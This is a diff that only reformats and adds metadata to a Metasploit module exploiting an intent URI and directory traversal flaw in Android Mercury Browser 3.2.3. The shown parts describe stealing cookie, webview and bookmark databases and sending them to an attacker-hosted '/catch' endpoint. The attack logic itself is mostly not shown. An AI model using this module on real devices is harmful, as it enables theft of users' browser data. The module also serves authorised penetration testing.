@@ -8,37 +8,44 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability',
-      'Description'    => %q{
-        This module exploits an unsafe intent URI scheme and directory traversal found in
-        Android Mercury Browser version 3.2.3. The intent allows the attacker to invoke a
-        private wifi manager activity, which starts a web server for Mercury on port 8888.
-        The webserver also suffers a directory traversal that allows remote access to
-        sensitive files.
+    super(
+      update_info(
+        info,
+        'Name' => 'Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability',
+        'Description' => %q{
+          This module exploits an unsafe intent URI scheme and directory traversal found in
+          Android Mercury Browser version 3.2.3. The intent allows the attacker to invoke a
+          private wifi manager activity, which starts a web server for Mercury on port 8888.
+          The webserver also suffers a directory traversal that allows remote access to
+          sensitive files.
 
-        By default, this module will go after webviewCookiesChromium.db, webviewCookiesChromiumPrivate.db,
-        webview.db, and bookmarks.db. But if this isn't enough, you can also specify the
-        ADDITIONAL_FILES datastore option to collect more files.
-      },
-      'Author'         =>
-        [
+          By default, this module will go after webviewCookiesChromium.db, webviewCookiesChromiumPrivate.db,
+          webview.db, and bookmarks.db. But if this isn't enough, you can also specify the
+          ADDITIONAL_FILES datastore option to collect more files.
+        },
+        'Author' => [
           'rotlogix', # Vuln discovery, PoC, etc
           'sinn3r',
           'joev'
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/' ],
           [ 'URL', 'http://versprite.com/og/multiple-vulnerabilities-in-mercury-browser-for-android-version-3-0-0/' ]
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptString.new('ADDITIONAL_FILES', [false, 'Additional files to steal from the device'])
-      ])
+      ]
+    )
   end
 
   def is_android?(user_agent)
@@ -67,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
     proto = (datastore['SSL'] ? 'https' : 'http')
     my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
     port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
-    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
+    resource = ('/' == get_resource[-1, 1]) ? get_resource[0, get_resource.length - 1] : get_resource
 
     "#{proto}://#{my_host}#{port_str}#{resource}/catch"
   end
@@ -145,7 +152,6 @@ class MetasploitModule < Msf::Auxiliary
   def hex2bin(hex)
     hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
   end
-
 
   def run
     exploit
